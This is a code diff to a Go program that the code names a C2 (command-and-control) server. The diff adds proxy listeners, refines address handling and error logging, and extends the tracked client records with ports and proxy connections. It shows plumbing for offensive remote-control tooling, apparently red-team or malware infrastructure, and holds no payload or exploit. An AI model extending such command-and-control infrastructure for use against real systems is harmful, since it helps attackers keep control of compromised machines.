@@ -105,22 +105,25 @@ func setupWebServer() *echo.Echo {
 
 func startC2Server() {
 	// Start server
-	address := fmt.Sprintf("%s:%s", cmd.IPServer, cmd.PortServer)
+	address := net.JoinHostPort(cmd.IPServer, cmd.PortServer)
 	listener, err := net.Listen("tcp", address)
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	fmt.Printf("Server started on %s\n", address)
 
+	// Launch proxies
+	for _, port := range cmd.ProxyPorts {
+		go cmd.StartProxy(port)
+	}
+
+	// Accept connection on main port (5437 localhost)
 	for {
-		// Accept new connections
 		conn, err := listener.Accept()
 		if err != nil {
-			fmt.Println(err)
+			log.Printf("Error accepting connection on C2 port: %v", err)
 			continue
 		}
-
 		go cmd.HandleConnection(conn)
 	}
 }
@@ -164,10 +167,12 @@ func initClientStore() {
 			ID:            c.ID,
 			IP:            c.IP,
 			OS:            c.OS,
-			PORT:          c.PORT,
+			SrcPort:       c.SrcPort,
+			DstPort:       c.DstPort,
 			LastConnexion: c.LastConnexion,
 			TYPE:          c.TYPE,
-			Conn:          nil,
+			ConnServer:    nil,
+			ConnProxy:     nil,
 			Icon:          c.Icon,
 			Reachable:     false,
 		}
